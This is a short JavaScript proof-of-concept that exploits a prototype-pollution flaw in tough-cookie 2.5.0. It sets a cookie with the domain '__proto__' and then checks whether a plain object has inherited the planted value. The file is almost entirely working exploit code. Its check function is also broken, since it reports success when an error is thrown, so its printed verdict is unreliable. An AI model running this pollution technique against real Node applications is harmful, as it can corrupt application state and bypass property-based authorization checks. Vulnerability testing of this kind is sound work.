async function main() {
    var tough = require("tough-cookie");

    // Creating a cookie jar
    var cookiejar = new tough.CookieJar(undefined, { rejectPublicSuffixes: false });

    // Exploiting the vulnerability in the original tough-cookie 2.5.0
    await cookiejar.setCookie(
        "Slonser=polluted; Domain=__proto__; Path=/notauth",
        "https://__proto__/admin", {loose: true}
    );

    // Checking if the exploit was successful
    var exploitSuccessful = checkExploit(cookiejar);

    if (exploitSuccessful) {
        console.log("EXPLOITED SUCCESSFULLY");
    } else {
        console.log("EXPLOIT FAILED");
    }
}

function checkExploit(cookiejar) {
    try {
        // Attempting to access the exploit cookie
        var a = {};
        return a["/notauth"]["Slonser"] === "polluted";
    } catch (error) {
        // If accessing the exploit cookie throws an error, the exploit failed
        return true;
    }
}

main();
